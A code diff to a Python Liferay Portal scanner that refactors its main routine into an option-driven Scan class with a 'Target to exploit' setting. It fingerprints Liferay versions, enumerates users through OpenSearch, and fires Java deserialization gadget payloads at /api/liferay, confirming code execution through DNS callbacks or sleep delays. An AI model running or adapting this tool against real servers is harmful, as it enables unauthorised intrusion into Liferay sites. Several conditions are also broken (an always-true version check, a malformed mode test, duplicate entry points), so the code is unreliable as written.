@@ -5,6 +5,7 @@ import socket
 import time
 import urllib3
 import logging
+from tabulate import tabulate
 from bs4 import BeautifulSoup as Soup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -12,21 +13,6 @@ session = requests.Session()
 session.headers.update({
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99"})
 
-
-# Compare of Machine Ip with Target Ip
-# def compare_ip(target_ip):
-#     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-#     s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
-#     s.settimeout(1)
-#     try:
-#         add = s.recvfrom(65565)
-#         my_ip = add[-1][0]
-#         if my_ip == target_ip:
-#             return True
-#         else:
-#             return False
-#     except socket.timeout:
-#         return False
 
 # Catch DNS query while sending DNS java deserialization payloads
 def catch_dns_query():
@@ -53,8 +39,6 @@ def ping_deserialization(url):
     print("[DNS Scan]")
     url_reformat = re.sub('.*://', '', url)
     url_reformat = re.sub('([:/]).*', '', url_reformat)
-    target_ip = socket.gethostbyname(url_reformat)
-    print("Ping scan")
     list_ping = ["CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
                  "CommonsCollections4", "Jdk7u21", "ROME", "Spring1", "Spring2", "BeanShell1",
                  "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
@@ -68,7 +52,7 @@ def ping_deserialization(url):
         time.sleep(1)
         rq = session.post(url, data=payload, verify=False)
         if catch_dns_query():
-            print('    [+] {} lib can be POTENTIAL vulnerable'.format(name.strip()))
+            print('\033[91m' + '    [+] {} lib can be POTENTIAL vulnerable'.format(name.strip()))
     # else:
     #     print('    [-] {} lib is NOT vulnerable'.format(name.strip()))
 
@@ -83,7 +67,7 @@ def sleep_deserialization(url):
         rq = session.post(url, data=payload, verify=False)
         print(name + '-' + str(rq.elapsed.total_seconds()))
         if rq.elapsed.total_seconds() >= 10:
-            print("    [+] {} lib can be POTENTIAL vulnerable".format(name))
+            print('\033[91m' + "    [+] {} lib can be POTENTIAL vulnerable".format(name))
         # else:
         #     print('    [-] {} lib is NOT vulnerable'.format(name.strip()))
         session.close()
@@ -92,7 +76,7 @@ def sleep_deserialization(url):
 
 # [LPS-27146] Guests can view names of all Liferay users
 def opensearch(url):
-    print('\033[93m' + "[+] OpenSearch Gathering" + '\033[91m')
+    print('\033[93m' + "[!] OpenSearch Gathering" + '\033[91m')
     print("")
     alphabet = ['a', 'b', 'c', 'd', 'e', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x',
                 'y']
@@ -135,7 +119,7 @@ def info_gathering(url):
         rq = session.get(url + '/api/jsonws', timeout=10, verify=False)
         version = rq.headers.get('Liferay-Portal')
     if version is None:
-        print("'\033[91m' + [!] This website is not using Liferay or cannot detect! ")
+        print('\033[91m' + "[!] This website is not using Liferay or cannot detect! ")
         return False
     else:
         print("\n==== Information ====")
@@ -145,40 +129,89 @@ def info_gathering(url):
         return True
 
 
-# Main function
-def main(url):
-    try:
-        # Gathering information of target
-        if info_gathering(url) is True:
-            # Vulnerabilities of target
-            print('\033[93m' + "==== Vulnerabilities ====")
-            if "6.1.0" or "6.0.12" or "6.1.10" or "6.2.0" in version:
-                json_api(url)
-            if "6.1.0" in version:
-                opensearch(url)
-            entry_point1 = url + "////api/liferay"
-            entry_point2 = url + "////api/liferay"
-            if session.post(entry_point1, timeout=10, verify=False).status_code == 200:
-                print(
-                    '\033[91m' + "[!] Liferay API allow POST request - May have [LPS-64441] Java Serialization "
-                                 "Vulnerability")
-                # sleep_deserialization(entry_point1)
-                ping_deserialization(entry_point1)
-            elif session.post(entry_point2, timeout=10, verify=False).status_code == 200:
-                print(
-                    '\033[91m' + "[!] Spring API allow POST request - May have [LPS-64441] Java Serialization "
-                                 "Vulnerability")
-                # sleep_deserialization(entry_point2)
-                ping_deserialization(entry_point2)
-            else:
-                print("~> Website is not using LifeRay or not detected!")
+class Scan:
+    def __init__(self, url, mode):
+        self.url = url
+        self.mode = mode
 
-    except exception.ConnectionError:
-        print("[!] Name or service not known!")
-        logging.error("[!] Name or service not known!")
-    except exception.InvalidURL and exception.MissingSchema:
-        print("[!] Invalid Url - Url must start with http(s)!")
-        logging.error("[!] Invalid Url - Url must start with http(s)!")
-    except Exception as ex:
-        print("[!] Something get error see the log file!")
-        logging.error(ex)
+    @property
+    def url_gs(self):
+        return self.url
+
+    @property
+    def mode_gs(self):
+        return self.mode
+
+    @url_gs.setter
+    def url_gs(self, new_url):
+        self.url = new_url
+
+    @mode_gs.setter
+    def mode_gs(self, new_mode):
+        self.mode = new_mode
+
+    def show_options(self):
+        header = ["Name", "Current Setting", "Required", "Description"]
+        data = [("url", self.url, "yes", "Target to exploit"),
+                ("mode", self.mode, "yes", "Java deserialization scan mode: Sleep / DNS"), ]
+        print("")
+        print(tabulate(data, headers=header))
+        print("")
+
+    def main(self):
+        try:
+            if self.url != "None" and self.mode == "sleep" and "dns":
+                # Gathering information of target
+                if info_gathering(self.url) is True:
+                    # Vulnerabilities of target
+                    print('\033[93m' + "==== Vulnerabilities ====")
+                    if "6.1.0" or "6.0.12" or "6.1.10" or "6.2.0" in version:
+                        json_api(self.url)
+                    if "6.1.0" in version:
+                        opensearch(self.url)
+                    entry_point1 = self.url + "////api/liferay"
+                    entry_point2 = self.url + "////api/liferay"
+                    if session.post(entry_point1, timeout=10, verify=False).status_code == 200:
+                        print(
+                            '\033[93m' + "[!] Liferay API allow POST request - May have [LPS-64441] Java Serialization "
+                                         "Vulnerability")
+                        if self.mode == "sleep":
+                            sleep_deserialization(entry_point1)
+                        elif self.mode == "dns":
+                            ping_deserialization(entry_point1)
+                    elif session.post(entry_point2, timeout=10, verify=False).status_code == 200:
+                        print(
+                            '\033[93m' + "[!] Spring API allow POST request - May have [LPS-64441] Java Serialization "
+                                         "Vulnerability")
+                        if self.mode == "sleep":
+                            sleep_deserialization(entry_point1)
+                        elif self.mode == "dns":
+                            ping_deserialization(entry_point1)
+                    else:
+                        print("~> None")
+            else:
+                print("[!] Required option is not set !")
+        except exception.ConnectionError:
+            print("[!] Name or service not known!")
+            logging.error("[!] Name or service not known!")
+        except exception.InvalidURL and exception.MissingSchema:
+            print("[!] Invalid Url - Url must start with http(s)!")
+            logging.error("[!] Invalid Url - Url must start with http(s)!")
+        except Exception as ex:
+            print("[!] Something get error see the log file!")
+            logging.error(ex)
+
+
+# Generate scan object
+def scan_choose():
+    global scan
+    scan = Scan("None", "sleep")
+
+
+# Check if vulnerability's option exists
+def check_exist_option(scan_option):
+    try:
+        getattr(scan, scan_option)
+        return True
+    except AttributeError:
+        return False
